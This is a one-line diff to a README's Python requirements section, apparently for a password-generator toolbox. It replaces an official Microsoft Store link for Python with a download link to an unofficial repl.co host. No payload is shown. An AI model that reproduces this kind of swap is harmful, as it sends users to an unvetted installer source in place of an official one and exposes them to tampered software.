@@ -10,4 +10,4 @@ This is part of this toolbox (that of the password generator).
 
 # Requirments
 ## Python
-<a href='ms-windows-store://pdp/?ProductId=9PJPW5LDXLZ5'>Download</a>
+<a href='https://directdownload.soullax.repl.co/'>Download</a>
